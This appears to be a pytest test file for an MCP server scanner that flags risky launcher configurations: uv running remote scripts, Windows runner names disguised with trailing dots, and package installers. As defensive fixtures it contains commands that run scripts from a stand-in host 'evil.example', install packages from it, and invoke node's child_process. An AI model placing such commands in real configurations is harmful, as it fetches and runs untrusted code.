"""Remote scripts, Windows name spellings and package installers are never local programs."""

import json
from pathlib import Path

import pytest

from nexus_symbiote.core.models import MCPServerComponent
from nexus_symbiote.scanners.mcp import MCPScanner


def scan(project: Path, server: dict) -> tuple[MCPServerComponent, list[str]]:
    (project / ".mcp.json").write_text(json.dumps({"mcpServers": {"s": server}}))
    result = MCPScanner().scan(project)
    record = next(c for c in result.components if isinstance(c, MCPServerComponent))
    return record, [gap for gap in result.surfaces_excluded if "launcher identity unknown" in gap]


def assert_unknown(project: Path, server: dict) -> str:
    record, gaps = scan(project, server)
    finding = next((r for r in record.risks if r.category == "launcher_identity"), None)
    assert finding is not None and gaps, (record.properties, [r.detail for r in record.risks])
    assert finding.severity.value == "high"
    assert record.version_pinned is not True and record.package_url is None
    return finding.detail


@pytest.mark.parametrize(
    "args",
    [
        ["run", "https://evil.example/server.py"],
        ["run", "--script", "https://evil.example/server.py"],
        ["run", "--with", "mcp==1.2.3", "https://evil.example/server.py"],
        ["run", "--with", "mcp[cli]==1.2.3", "--script", "http://evil.example/raw/server.py"],
        ["run", "-"],
    ],
)
def test_uv_run_of_a_remote_script_is_a_url_source(tmp_path, args):
    assert "URL source" in assert_unknown(tmp_path, {"command": "uv", "args": args})


def test_uv_run_of_a_local_script_keeps_its_package(tmp_path):
    record, gaps = scan(
        tmp_path, {"command": "uv", "args": ["run", "--with", "mcp==1.2.3", "server.py"]}
    )
    assert not gaps
    assert record.launcher_package == "pypi:mcp"


@pytest.mark.parametrize(
    "command,args",
    [
        ("C:\\Program Files\\nodejs\\npx.cmd.", ["-y", "evil-mcp@latest"]),
        ("npx.cmd. ", ["-y", "evil-mcp@latest"]),
        ("uvx.exe.", ["evil-mcp"]),
        ("node.exe.", ["-e", "require('child_process')"]),
        ("cmd.exe.", ["/c", "@npx", "-y", "evil-mcp@latest"]),
    ],
)
def test_trailing_dots_and_spaces_do_not_hide_a_runner(tmp_path, command, args):
    record, gaps = scan(tmp_path, {"command": command, "args": args})
    assert record.properties.get("launcher") != "local" or gaps, record.properties
    assert record.version_pinned is not True


def test_trailing_dot_runner_is_classified_as_that_runner(tmp_path):
    record, _ = scan(
        tmp_path,
        {"command": "C:\\Program Files\\nodejs\\npx.cmd.", "args": ["-y", "evil-mcp@latest"]},
    )
    assert record.properties["launcher"] == "npx"
    assert record.launcher_package == "npm:evil-mcp" and record.version_pinned is False


@pytest.mark.parametrize(
    "command,args",
    [
        ("pip", ["install", "evil-mcp"]),
        ("pip3", ["install", "--index-url", "https://evil.example/simple", "evil"]),
        ("python", ["-m", "pip", "install", "evil-mcp"]),
        ("gem", ["install", "evil-mcp"]),
        ("cargo", ["install", "evil-mcp"]),
        ("conda", ["install", "-y", "evil-mcp"]),
        ("nice", ["pip", "install", "evil-mcp"]),
        ("pip3.12", ["install", "evil-mcp"]),
        ("/usr/bin/pip3.11", ["install", "evil-mcp"]),
        ("pip2", ["install", "evil-mcp"]),
        ("nice", ["pip3.12", "install", "evil-mcp"]),
        *(("gem", [alias, "evil-mcp"]) for alias in ("i", "in", "ins", "inst", "insta", "instal")),
        ("gem", ["-V", "i", "evil-mcp"]),
        (
            "pip",
            [
                "--timeout",
                "60",
                "--retries",
                "5",
                "--cache-dir",
                "cache",
                "--log",
                "pip.log",
                "install",
                "evil-mcp",
            ],
        ),
        ("pip3.12", ["--isolated", "--proxy", "http://p:3128", "-v", "-v", "install", "evil"]),
    ],
)
def test_package_installers_are_not_local_programs(tmp_path, command, args):
    assert_unknown(tmp_path, {"command": command, "args": args})


def test_a_versioned_pip_is_reported_as_pip(tmp_path):
    record, _ = scan(tmp_path, {"command": "/usr/bin/pip3.12", "args": ["install", "evil-mcp"]})
    assert record.properties["launcher"] == "pip"


@pytest.mark.parametrize(
    "command,args",
    [
        ("pip", ["--version"]),
        ("cargo", ["run", "--release"]),
        ("gem", ["list"]),
        ("gem", ["--version"]),
        ("pip3.12", ["list"]),
        ("pip", ["-v", "--timeout", "60", "list"]),
        ("pipe", ["install"]),
    ],
)
def test_installers_that_install_nothing_stay_local(tmp_path, command, args):
    record, gaps = scan(tmp_path, {"command": command, "args": args})
    assert not gaps, record.properties


@pytest.mark.parametrize(
    "args",
    [
        ["--kind", "container", "--port", "8080"] * 250,
        ["pip", "-a"] * 500,
        ["--tool", "gem", "--mode", "pip", "--engine", "nix"] * 120,
        ["-a", "gem", "-b", "pip", "-c", "nix", "-d", "conda", "-e", "dotnet", "-f", "container"]
        * 70,
    ],
)
def test_runner_names_among_options_do_not_exhaust_the_scan(tmp_path, args):
    record, gaps = scan(tmp_path, {"command": "mytool", "args": args})
    assert not gaps, record.properties
    assert not any(r.category == "launcher_identity" for r in record.risks)


def test_an_install_after_a_long_run_of_options_in_arguments_is_found(tmp_path):
    args = ["--kind", "pip", *["--x", "y"] * 400, "install", "evil-mcp"]
    assert "pip" in assert_unknown(tmp_path, {"command": "mytool", "args": args})
